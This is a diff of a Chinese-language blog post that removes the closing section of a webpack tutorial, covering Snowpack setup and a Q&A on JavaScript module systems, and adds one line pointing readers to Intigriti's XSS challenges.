-webpack 的教學就到這邊了，我沒有打算繼續深講，再講下去就比較偏向工具的使用了。我寫這篇最主要的目的只是想讓你知道：
-
-1. 為什麼要用 webpack？
-2. 不用 webpack 的話會怎樣？
-3. webpack 與 ES6 定義的標準模組有什麼差別？
-4. webpack 的最基礎使用（寫設定檔與打包 JS）
-
-## Snowpack
-
-前面我們有提到使用 webpack 的原因之一是原生的瀏覽器沒辦法打包 npm 安裝的模組，而 webpack 除了解決這個問題之外，還順便擴展了「模組」的定義，任何資源都可以視為一個模組，搭配強大的 loader 與 plugin 系統也可以做出更多有趣的事。
-
-而近期剛好出了另外一個 library：[Snowpack](https://www.snowpack.dev/)，標榜的就是不需要打包就能夠在瀏覽器上面跑，而原理十分簡單，其實就是幫你把 `node_modules` 安裝的模組整理了一下，放到另一個叫做 `web_modules` 的資料夾，要引入的時候去那邊引入就好了。
-
-不過並不是每個模組都可以這樣，必須模組本身有支援標準的 ESM module 才行。像我們剛剛所使用的`pad-left` 就沒有，所以沒有辦法搭配 Snowpack 使用，因此我們等等會再裝一個有支援的 `mathjs` 來試試看。
-
-我們立刻來體驗一下吧，先把 Snowpack 跟 mathjs 裝起來：
-
-```
-npm install --save-dev snowpack
-npm install mathjs
-```
-
-接著執行 Snowpack，讓它把模組整理好：
-
-```
-npx snowpack
-```
-
-執行完之後，就會看到多了一個 `web_modules` 的資料夾，底下有兩個檔案：`import-map.json` 與 `mathjs.js`
-
-接著我們更新一下 main.js：
-
-``` js
-import obj from './utils.js'
-import {pi} from './web_modules/mathjs.js' // 從 web_modules 資料夾引入
-console.log(obj.cal(30))
-console.log(pi)
-```
-
-然後更新 index.html：
-
-``` html
-<html>
-<head>
-  <script src="./main.js" type="module"></script>
-</head>
-<body>
-</body>
-</html>
-
-```
-
-最後一樣要用指令跑一個 server 起來：`python -m SimpleHTTPServer 8080`
-
-發現 console 有出現 3.141592653589793，代表可以順利使用我們用 npm 安裝的模組了！
-
-Snowpack 的使用方式就是那麼簡單，要解決的問題也很簡單，它只負責解決「引入第三方模組」這一塊，其他的不在它管理的範疇。
-
-它能像 webpack 那樣子引入圖片跟 CSS 嗎？不行，而且官方網站直接建議你用以前的那些方法就好了：
-
-![](/img/mods/snowpack.png)
-
-在官網上也有誰應該要用 Snowpack 誰應該不要用的段落，例如說你想要支援 IE11 或是你需要用到不支援 ESM 的函式庫的話，就不應該使用 Snowpack。
-
-Snowpack 還很新，而且若是想在 production 上面使用應該還有滿多問題要解決，我在這邊特別提它的目的是想讓大家看看除了 webpack 以外的另一種解決方式。
-
-而你可能聽過的 [parcel](https://parceljs.org/) 或者是 [rollup](https://rollupjs.org/guide/en/)，都只是另外一種幫你打包的工具而已。你可以選一套工具來熟悉就好，但重點是在這之前，你必須清楚知道為什麼需要這些工具。
-
-
-## 結語
-
-先來回答開頭那幾個問題：
-
-#### Q：為什麼很多專案（例如說 React）在部署前都要先 build？這個步驟在幹嘛你知道嗎？
-
-因為原始碼沒辦法直接放上去瀏覽器（會沒有辦法執行），所以一定要經過 webpack 打包處理，打包完的檔案才能讓瀏覽器執行。
-
-
-#### Q：你知道 `require/module.exports` 與 `import/export` 的差別嗎？
-
-`require/module.exports` 是一套叫做 CommonJS 的規範，Node.js 有支援，瀏覽器沒有。
-
-`import/export` 是 ES6 的規範，Node.js 部分支援，瀏覽器也是部分支援。
-
-#### Q：你知道 import 與 export 這兩個語法在瀏覽器上面不是隨便就能使用嗎？
-
-有使用限制，例如說要加上 `type=module`，而且也沒辦法直接引入 npm 裡的模組，要把路徑寫死才能使用。而瀏覽器支援度也是一個考量，IE11 並不支援此種寫法。
-
-#### Q：你知道為什麼要用 webpack 嗎？
-
-原因有很多，例如說：
-
-1. 我想使用 npm 上的第三方模組
-2. 我想把圖片當作資源 import 進來
-3. 我想把 CSS 當作資源 import 進來
-4. 我想在一個地方就處理好 uglify 與 minify
-
-不過重點其實是第一個，因為瀏覽器原生的 ES6 模組支援度沒那麼高，尤其是引入第三方模組，所以才需要透過 webpack 或其他打包工具幫我們處理好這一段。
-
-#### Q：你知道 webpack 為什麼要有 loader 嗎？
-
-因為把圖片或是 CSS 當作資源引入這並不是正式的規範，而是 webpack 自己延伸的定義。為了支援這些資源，就必須特別寫一個 loader 去載入，否則預設的 loader 只能載入 JavaScript。
-
------
-
-我一開始接觸 webpack 時，也是超級霧煞煞。完全不知道為什麼要 webpack，也完全不知道它做了哪些魔法。
-
-直到後來慢慢摸索才發現自己一開始就錯了，不該從 webpack 開始的。連模組化的概念都不清楚，連瀏覽器上面不能用 require 都不知道，怎麼可能理解 webpack 在幹嘛？
-
-而前陣子接觸到的一些學生，儘管是有工作經驗或是有用過 webpack 的，對這一塊也是一知半解。而在我看來，原因就是對於模組化的理解不足，對於歷史脈絡的了解不夠，對於「在瀏覽器上面執行 JS」以及「在電腦上用 Node.js 執行 JS」這兩者的區分不夠清楚，才會把許多東西都混為一談，當作是同一種。
-
-所以這篇雖然是叫做「webpack 新手教學」，但比較多在談的是模組化以及使用 webpack 的理由，對於真正「如何使用 webpack」並沒有加以著墨。原因之一是我認為理解原理跟理由之後，使用工具的門檻就會降低很多；之二是再寫下去就沒完沒了了，真的想講 webpack 的話可以再開一篇文章。
-
-其實有關於模組化，我有很多東西刻意沒有提到，例如說 AMD/UMD 等等的其他規範以及 RequireJS 這個工具。我覺得對這一篇想表達的東西來說，不講這些反而是好的，因為一旦講了就會把事情搞得更複雜，所以選擇性忽略這些內容。
-
-在寫作的時候，選擇什麼要講什麼不講也是一門技藝，或許日後可以再寫一篇文章來補齊沒有講到的這些部分。
-
-最後，希望大家看完這篇以後真的能理解 ES6 的原生模組在瀏覽器上面會碰到的問題，就能知道為什麼要用 webpack。
-
-若是有任何錯誤還麻煩不吝指正，感謝！
-
-參考資料：
-
-1. [什麼？！我們竟然有 3 個標準？ - 你有聽過 CommonJS 嗎？(Day9)](https://ithelp.ithome.com.tw/articles/10191478)
+如果對 XSS 挑戰有興趣，可以關注 [Intigriti](https://twitter.com/intigriti) 並且等待下一次的挑戰。
